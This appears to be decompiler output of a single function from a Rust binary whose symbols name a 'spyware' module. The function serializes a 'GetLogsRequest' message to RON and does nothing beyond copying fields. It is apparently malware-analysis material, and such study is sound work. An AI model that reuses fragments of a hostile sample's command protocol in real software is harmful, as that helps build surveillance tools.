int * _ZN7spyware13communication8messages1_100__LT_impl_u20_serde__ser__Serialize_u20_for_u20_spyware__communication__messages__GetLogsRequest_GT_9serialize17he6158cb9ea855423E
                (int *param_1,undefined8 param_2,undefined8 param_3)

{
  int local_38;
  int local_34;
  undefined8 local_30;
  undefined local_28;
  undefined8 uStack_27;
  undefined7 uStack_1f;
  undefined local_18;
  undefined7 uStack_17;
  undefined8 uStack_10;
  
  _ZN84__LT__RF_mut_u20_ron__ser__Serializer_LT_W_GT__u20_as_u20_serde__ser__Serializer_GT_16serialize_struct17h19528d03ac3c512bE
            (&local_38,param_3,&DAT_001125c1,0xe,0);
  if (local_38 == 0x21) {
    _ZN75__LT_ron__ser__Compound_LT_W_GT__u20_as_u20_serde__ser__SerializeStruct_GT_3end17h1114ba35daa4ac40E
              (param_1,local_30,local_28);
    return param_1;
  }
  *(ulong *)(param_1 + 8) = CONCAT71(uStack_17,local_18);
  *(undefined8 *)(param_1 + 10) = uStack_10;
  *(undefined8 *)((long)param_1 + 0x11) = uStack_27;
  *(ulong *)((long)param_1 + 0x19) = CONCAT17(local_18,uStack_1f);
  *param_1 = local_38;
  param_1[1] = local_34;
  *(undefined8 *)(param_1 + 2) = local_30;
  *(undefined *)(param_1 + 4) = local_28;
  return param_1;
}